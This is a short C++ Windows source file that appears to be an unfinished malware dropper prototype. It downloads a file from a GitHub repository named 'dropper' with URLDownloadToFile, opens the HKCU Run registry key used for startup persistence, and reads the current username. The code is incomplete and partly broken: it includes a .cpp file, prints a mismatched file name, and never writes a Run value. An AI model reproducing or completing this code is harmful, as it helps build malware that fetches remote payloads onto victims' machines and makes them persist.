#include <iostream>
using namespace std;
#include <string>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
#include "Source1.cpp";
#include <winreg.h>
int getusername()
{
	
	TCHAR name[UNLEN + 1];
	DWORD size = UNLEN + 1;

	if (GetUserName((TCHAR*)name,&size)) {
		wcout << name;
		ofstream outfile;
		outfile.open("user.txt");
		outfile << "test";
		std::cout << name;
		
	}
    return 0;
}
 void test(){
    // URL of the music file, image file etc.
    const wchar_t* sURL = L"https://github.com/Luqmaan2/dropper/raw/main/test.docx";

    // Name of the Destination file 
    const wchar_t* dFile = L"test.docx";

    if (S_OK == URLDownloadToFile(NULL, sURL, dFile, 0, NULL))
    {

        cout << "The file is saved to image.png" << endl;
       

    }

    else
    {

        cout << "Unable to Download the file.";
       

    }
}
 void reg() {
     HKEY hkey;
     LONG reg_acc;
     reg_acc = RegCreateKeyEx(
         HKEY_CURRENT_USER,
         L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         0,
         NULL,
         REG_OPTION_NON_VOLATILE,
         KEY_ALL_ACCESS | KEY_WOW64_64KEY,
         NULL,
         &hkey,
         NULL);
     
 }
 int main() {
     reg();
 }
